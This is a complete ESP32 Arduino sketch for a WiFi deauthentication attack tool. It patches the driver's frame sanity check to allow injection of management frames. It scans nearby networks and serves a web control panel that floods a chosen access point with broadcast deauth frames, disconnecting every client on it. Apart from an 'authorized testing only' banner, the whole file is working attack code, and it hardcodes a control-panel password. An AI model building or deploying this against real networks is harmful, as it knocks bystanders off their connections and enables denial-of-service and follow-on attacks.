#include <WiFi.h>
#include <WebServer.h>
extern "C" {
  #include "esp_wifi.h"
  // Override the driver's raw-frame filter so management frames (deauth/disassoc)
  // are allowed through esp_wifi_80211_tx(). Returning 0 = "frame is valid".
  int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
  }
}

// --- Control panel AP settings ---
const char* controlSSID = "ESP32-Deauth-Control";
const char* controlPass = "calebRox123"; // WPA2 min 8 chars

WebServer server(80);

uint8_t deauthFrame[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x07, 0x00
};

bool attacking = false;
uint8_t targetBSSID[6];
int targetChannel = 1;
volatile unsigned long packetsSent = 0;

void sendDeauth(const uint8_t* bssid, int count = 5) {
  uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  memcpy(&deauthFrame[4], broadcast, 6);
  memcpy(&deauthFrame[10], bssid, 6);
  memcpy(&deauthFrame[16], bssid, 6);
  for (int i = 0; i < count; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
    packetsSent++;
    delay(20);
  }
}

String macToStr(const uint8_t* mac) {
  char buf[18];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
  return String(buf);
}

void handleRoot() {
  String html = R"HTML(
<!DOCTYPE html><html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ESP32 WiFi Test Tool</title>
<style>
:root{
  --bg:#0d1117; --panel:#161b22; --panel2:#1c2330; --line:#2b3444;
  --txt:#e6edf3; --muted:#8b949e; --accent:#3b82f6; --danger:#ef4444;
  --ok:#22c55e; --warn:#f59e0b;
}
*{box-sizing:border-box}
body{
  font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
  margin:0;background:var(--bg);color:var(--txt);
  padding:16px 12px 140px;line-height:1.4;
}
.wrap{max-width:560px;margin:0 auto}
header{display:flex;align-items:center;gap:12px;margin-bottom:14px}
header .logo{
  width:40px;height:40px;border-radius:10px;flex:0 0 auto;
  background:linear-gradient(135deg,#3b82f6,#8b5cf6);
  display:flex;align-items:center;justify-content:center;font-size:20px
}
header h1{font-size:18px;margin:0}
header p{margin:2px 0 0;font-size:12px;color:var(--muted)}
.warn{
  background:rgba(245,158,11,.12);border:1px solid rgba(245,158,11,.35);
  color:#fcd34d;padding:10px 12px;border-radius:10px;font-size:12.5px;margin-bottom:14px
}
.bar{display:flex;gap:8px;align-items:center;margin-bottom:12px}
.btn{
  border:1px solid var(--line);background:var(--panel2);color:var(--txt);
  padding:10px 14px;border-radius:10px;font-size:14px;cursor:pointer;
  transition:.15s;display:inline-flex;align-items:center;gap:8px;justify-content:center
}
.btn:hover{border-color:var(--accent)}
.btn:active{transform:translateY(1px)}
.btn.primary{background:var(--accent);border-color:var(--accent)}
.btn.grow{flex:1}
.btn:disabled{opacity:.45;cursor:not-allowed}
label.auto{font-size:12px;color:var(--muted);display:flex;align-items:center;gap:6px;cursor:pointer;user-select:none}
.spin{width:14px;height:14px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite}
@keyframes sp{to{transform:rotate(360deg)}}
#networks{display:flex;flex-direction:column;gap:8px}
.net{
  background:var(--panel);border:1px solid var(--line);border-radius:12px;
  padding:11px 13px;cursor:pointer;transition:.12s;display:flex;align-items:center;gap:12px
}
.net:hover{border-color:#3d4a5e;background:var(--panel2)}
.net.sel{border-color:var(--accent);background:rgba(59,130,246,.1)}
.net .info{flex:1;min-width:0}
.net .ssid{font-weight:600;font-size:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.net .ssid .hidden{color:var(--muted);font-style:italic;font-weight:400}
.net .meta{font-size:11.5px;color:var(--muted);font-family:ui-monospace,Menlo,Consolas,monospace;margin-top:2px}
.chip{display:inline-block;background:var(--panel2);border:1px solid var(--line);border-radius:6px;padding:1px 6px;font-size:10.5px;color:var(--muted);margin-left:6px;font-family:system-ui}
.sig{display:flex;align-items:flex-end;gap:2px;height:22px;flex:0 0 auto}
.sig span{width:4px;background:var(--line);border-radius:1px}
.sig span.on{background:var(--ok)}
.sig.w span.on{background:var(--warn)}
.sig.b span.on{background:var(--danger)}
.sig span:nth-child(1){height:6px}
.sig span:nth-child(2){height:11px}
.sig span:nth-child(3){height:16px}
.sig span:nth-child(4){height:22px}
.empty{color:var(--muted);text-align:center;padding:24px;font-size:13px}
.dock{
  position:fixed;left:0;right:0;bottom:0;background:var(--panel);
  border-top:1px solid var(--line);padding:12px;
}
.dock .in{max-width:560px;margin:0 auto}
.stat{display:flex;align-items:center;gap:10px;margin-bottom:10px;font-size:13px}
.pill{display:inline-flex;align-items:center;gap:7px;padding:5px 11px;border-radius:20px;font-size:12.5px;font-weight:600}
.pill.idle{background:var(--panel2);color:var(--muted)}
.pill.live{background:rgba(239,68,68,.15);color:#fca5a5}
.dot{width:8px;height:8px;border-radius:50%;background:currentColor}
.pill.live .dot{animation:pulse 1s ease-in-out infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.25}}
.stat .tgt{color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;flex:1}
.stat .cnt{margin-left:auto;font-family:ui-monospace,Consolas,monospace;color:var(--txt)}
.stat .cnt b{color:var(--accent)}
.dock .row{display:flex;gap:8px}
</style></head><body>
<div class="wrap">
  <header>
    <div class="logo">&#128225;</div>
    <div>
      <h1>ESP32 WiFi Test Tool</h1>
      <p>802.11 deauth test harness</p>
    </div>
  </header>
  <div class="warn">&#9888;&#65039; <b>Authorized testing only.</b> Use exclusively on networks you own or have written permission to test.</div>
  <div class="bar">
    <button class="btn primary grow" id="scanBtn" onclick="scan()">Scan networks</button>
    <label class="auto"><input type="checkbox" id="auto"> auto</label>
  </div>
  <div id="networks"><div class="empty">Tap &ldquo;Scan networks&rdquo; to begin.</div></div>
</div>

<div class="dock"><div class="in">
  <div class="stat">
    <span class="pill idle" id="pill"><span class="dot"></span><span id="pillTxt">Idle</span></span>
    <span class="tgt" id="tgt">No target selected</span>
    <span class="cnt"><b id="pkts">0</b> pkts</span>
  </div>
  <div class="row">
    <button class="btn grow" id="startBtn" onclick="start()" disabled>Start deauth</button>
    <button class="btn grow" id="stopBtn" onclick="stop()" disabled>Stop</button>
  </div>
</div></div>

<script>
let selected=null, autoTimer=null;
const $=id=>document.getElementById(id);

function bars(rssi){
  let n = rssi>=-55?4 : rssi>=-65?3 : rssi>=-72?2 : 1;
  let cls = n>=3?'' : n==2?'w':'b';
  let s='';
  for(let i=1;i<=4;i++) s+=`<span class="${i<=n?'on':''}"></span>`;
  return `<div class="sig ${cls}">${s}</div>`;
}
function esc(s){return s.replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}

function scan(){
  const b=$('scanBtn');
  b.disabled=true; b.innerHTML='<span class="spin"></span>Scanning';
  fetch('/scan').then(r=>r.json()).then(data=>{
    data.sort((a,b)=>b.rssi-a.rssi);
    const box=$('networks');
    if(!data.length){box.innerHTML='<div class="empty">No networks found.</div>';}
    else{
      box.innerHTML=data.map(n=>{
        const name=n.ssid?esc(n.ssid):'<span class="hidden">&lt;hidden&gt;</span>';
        const sel=selected&&selected.bssid===n.bssid?' sel':'';
        return `<div class="net${sel}" data-b="${n.bssid}" onclick='pick(${JSON.stringify(n)})'>
          <div class="info">
            <div class="ssid">${name}<span class="chip">ch ${n.channel}</span></div>
            <div class="meta">${n.bssid} &middot; ${n.rssi} dBm</div>
          </div>${bars(n.rssi)}
        </div>`;
      }).join('');
    }
  }).catch(()=>$('networks').innerHTML='<div class="empty">Scan failed.</div>')
  .finally(()=>{b.disabled=false; b.textContent='Scan networks';});
}

function pick(n){
  selected=n;
  document.querySelectorAll('.net').forEach(e=>e.classList.toggle('sel',e.dataset.b===n.bssid));
  $('tgt').innerHTML=esc(n.ssid||'&lt;hidden&gt;')+' &middot; ch'+n.channel;
  $('startBtn').disabled=false;
}
function start(){
  if(!selected)return;
  fetch(`/attack?bssid=${selected.bssid}&channel=${selected.channel}`).then(poll);
}
function stop(){ fetch('/stop').then(poll); }

function render(s){
  const live=s.attacking;
  $('pill').className='pill '+(live?'live':'idle');
  $('pillTxt').textContent=live?'Deauthing':'Idle';
  $('pkts').textContent=s.packets.toLocaleString();
  $('stopBtn').disabled=!live;
  $('startBtn').disabled=live||!selected;
}
function poll(){ fetch('/status').then(r=>r.json()).then(render).catch(()=>{}); }

$('auto').addEventListener('change',e=>{
  if(e.target.checked){scan();autoTimer=setInterval(scan,8000);}
  else{clearInterval(autoTimer);autoTimer=null;}
});
setInterval(poll,1000); poll();
</script>
</body></html>
)HTML";
  server.send(200, "text/html", html);
}

void handleScan() {
  int n = WiFi.scanNetworks();
  String json = "[";
  for (int i = 0; i < n; i++) {
    if (i > 0) json += ",";
    json += "{\"ssid\":\"" + WiFi.SSID(i) + "\",";
    json += "\"bssid\":\"" + macToStr(WiFi.BSSID(i)) + "\",";
    json += "\"channel\":" + String(WiFi.channel(i)) + ",";
    json += "\"rssi\":" + String(WiFi.RSSI(i)) + "}";
  }
  json += "]";
  server.send(200, "application/json", json);
}

void handleAttack() {
  String bssidStr = server.arg("bssid");
  targetChannel = server.arg("channel").toInt();

  int vals[6];
  sscanf(bssidStr.c_str(), "%x:%x:%x:%x:%x:%x",
         &vals[0],&vals[1],&vals[2],&vals[3],&vals[4],&vals[5]);
  for (int i = 0; i < 6; i++) targetBSSID[i] = (uint8_t)vals[i];

  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  attacking = true;
  server.send(200, "text/plain", "started");
}

void handleStop() {
  attacking = false;
  server.send(200, "text/plain", "stopped");
}

void handleStatus() {
  String json = "{";
  json += "\"attacking\":" + String(attacking ? "true" : "false") + ",";
  json += "\"packets\":" + String(packetsSent) + ",";
  json += "\"channel\":" + String(targetChannel) + ",";
  json += "\"bssid\":\"" + macToStr(targetBSSID) + "\"}";
  server.send(200, "application/json", json);
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(controlSSID, controlPass);
  Serial.print("Control panel at: http://");
  Serial.println(WiFi.softAPIP());

  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/attack", handleAttack);
  server.on("/stop", handleStop);
  server.on("/status", handleStatus);
  server.begin();
}

void loop() {
  server.handleClient();
  esp_wifi_set_promiscuous(true);
  if (attacking) {
    sendDeauth(targetBSSID, 3);
  }
}
